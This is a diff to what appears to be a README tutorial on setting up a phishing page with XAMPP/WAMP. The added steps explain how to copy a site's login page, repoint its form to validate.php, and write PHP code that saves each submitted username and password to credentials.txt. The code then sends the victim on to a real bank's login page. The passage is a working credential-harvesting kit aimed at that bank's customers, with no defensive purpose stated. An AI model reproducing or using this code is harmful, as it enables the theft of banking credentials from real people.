@@ -12,6 +12,38 @@ How to host the phishing page on our computer using XAMPP/WAMP ?
 
 1) Open the website in the browser for which you want to create a phishing page. Right click and save as index.html.
 
+2) Then open that html in a note pad. Now search string "action" and change address to validate.php
+
+                   <form action="validate.php" method="post">
+
+3) Now open notepad, type following code in it and save it as validate.php. This is create for store credentials.
+
+                    <?php
+                    $username = $_POST["username"];
+                    $password = $_POST["passwd"];
+ 
+                    //Get credentials to .txt file
+                    $myfile = fopen("credentials.txt", "a") or die("Unable to open file!");
+                    $txt = "USERNAME = $username , PASSWORD = $password\n";
+                    fwrite($myfile, "\n". $txt);
+                    fclose($myfile);
+ 
+                    //Redirect the browser to original login page
+                    header("Location: https://www.ebank.peoplesbank.lk/eb/index.html");
+ 
+                    exit();
+
+                    ?>
+
+4) Then create credentials.txt file to store these credentials.
+
+5) Host that created files to XAMMP/WAMP.
+
+6) Then run that phishing website on browser and enter credentials.
+
+7) That credentials store credentials.txt file.
+
+
 
 
 
